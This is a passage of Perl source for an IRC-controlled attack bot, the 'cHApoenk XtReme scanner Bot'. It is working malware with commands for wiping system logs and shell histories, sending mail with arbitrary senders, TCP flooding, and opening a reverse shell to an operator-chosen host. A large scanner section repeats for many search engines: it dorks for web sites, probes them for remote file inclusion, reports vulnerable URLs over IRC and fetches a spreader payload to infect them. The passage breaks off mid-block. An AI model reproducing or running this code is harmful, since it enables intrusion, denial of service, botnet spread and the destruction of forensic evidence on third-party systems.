#                    #
######################
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
######################
#    Log Cleaner     #  
#                    #
######################
if ($funcarg =~ /^logcleaner/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LogCleaner4+) This process can be long, just wait"); 
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
	system 'rm -rf /etc/wtmp';
	system 'rm -rf /var/run/utmp';
	system 'rm -rf /etc/utmp';
	system 'rm -rf /var/log';
	system 'rm -rf /var/logs';
	system 'rm -rf /var/adm';
	system 'rm -rf /var/apache/log';
	system 'rm -rf /var/apache/logs';
	system 'rm -rf /usr/local/apache/log'; 
	system 'rm -rf /usr/local/apache/logs';
	system 'rm -rf /root/.bash_history';
	system 'rm -rf /root/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LogCleaner4+) All default log and bash_history files erased"); 
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LogCleaner4+) Now Erasing the rest of the machine log files");
	system 'find / -name *.bash_history -exec rm -rf {} \;';
	system 'find / -name *.bash_logout -exec rm -rf {} \;';
	system 'find / -name "log*" -exec rm -rf {} \;';
	system 'find / -name *.log -exec rm -rf {} \;';
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LogCleaner4+) Done! All logs erased"); 
      }
######################
# End of Log Cleaner #  
#                    #
######################
# 
# cHApoenk XtReme scanner Bot
#
######################
#       MAILER       #  
#                    #
######################
# For mailing use :
# !bgr @sendmail <subject> <sender> <recipient> <message>
#
######################
if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Mailer4+) Sending Mail to :10 $3");
$subject = $1;
$sender = $2;
$recipient = $3; 
@corpo = $4;
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n"; 
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Mailer4+) Mail Sended To :10 $recipient"); 
}
######################
#   End of MAILER    #  
#                    #
######################
######################
#  Join And Part     # 
#                    #
######################
           if ($funcarg =~ /^join (.*)/) {
              sendraw($IRC_cur_socket, "JOIN ".$1);
           }
           if ($funcarg =~ /^part (.*)/) {
              sendraw($IRC_cur_socket, "PART ".$1);
           }
		   
######################
#End of Join And Part# 
#                    #
######################
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
######################
#     TCPFlood       # 
#                    #
######################

if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+TCPKill4+) Attacking 4 ".$1.":".$2." for 4 ".$3." seconds.");
  my $itime = time;
  my ($cur_time);
  $cur_time = time - $itime;
  while ($3>$cur_time){
  $cur_time = time - $itime;
  &tcpflooder("$1","$2","$3");
}
sendraw($IRC_cur_socket,"PRIVMSG $printl :(4+TCPKill4+) Attack done 4 ".$1.":".$2.".");
}
######################
#  End of TCPFlood   # 
#                    #
######################
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
######################
#   Back Connect     # 
#                    #
######################
if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
my $host = "$1";
my $porta = "$2";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
  $shell = "cmd.exe";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, $paddr) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("$shell");
close(STDIN);
close(STDOUT);
close(STDERR);
if ($estatisticas)
{
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+BackConnect4+) Connecting to 4 $host:$porta");
}
}
######################
#End of  Back Connect# 
#                    #
######################
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
######################
#    EXTREME scanNER # 
#                    #
######################
######################################################################
#################### GOOGLE
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
### Start Message
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Initializing4+) Backdoor scan is for12 $bug and12 $dork");
### End of Start Message
# Starting The Search Engine
	my @google=&googlet($dork);
#
push(my @tot, @google);
#
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Google4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Google4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl  :4 dapet boss(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate  :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :3busuk..sem -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### AllTheWeb
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @alltheweb=&allthewebt($dork);
	my @allweb=&standard($dork);
#
push(my @tot, @alltheweb, @allweb);
#
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+AllWeb4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+AllWeb4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl  :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### LYCOS
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @lylist=&lycos($dork);
push(my @lybyp,@lylist);
#
push(my @tot, @lybyp);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Lycos4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Lycos4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### Yahoo
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @ylist=&yahoo($dork);
	my @yalist=&yahooa($dork);
	my @yblist=&yahoob($dork);
	my @yclist=&yahooc($dork);
	my @ydlist=&yahood($dork);
		push(my @yahoobypass, @ylist, @yalist, @yblist, @yclist, @ydlist );	
#
push(my @tot, @yahoobypass);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Yahoo4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Yahoo4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### MSN
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @mlist=&msn($dork);
push(my @tot, @mlist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+MSN4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+MSN4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### SEARCH
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @slist=&search($dork);
push(my @tot, @slist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Search4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Search4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### FireBall
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @fireball=fireball($dork);
push(my @tot, @fireball);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+FireBall4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+FireBall4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### UOL
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @ulist=&uol($dork);
push(my @tot, @ulist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+UOL4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+UOL4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### ALTAVISTA
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @alist=&altavista($dork);
	my @ablist=&altavistade($dork);
	my @aclist=&altavistaus($dork);
push(my @tot, @alist,@ablist,@aclist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Altavista4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Altavista4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### HOTBOT
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @hlist=&hotbot($dork);
push(my @tot, @hlist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+HotBot4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+HotBot4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### MAMMA
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @malist=&mamma($dork);
push(my @tot, @malist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Mamma4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+Mamma4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### MOZBOT
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @mozlist=&mozbot($dork);
push(my @tot, @mozlist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+MozBot4+ Total:14 ".scalar(@tot)." Cleaned:14 ".scalar(@puliti)." for4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4+MozBot4+ finished for14 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
  sendraw($IRC_cur_socket, "PRIVMSG billgate :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4Dibuang Sayang -5>>> (12+Vuln:5 $print 12+)");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
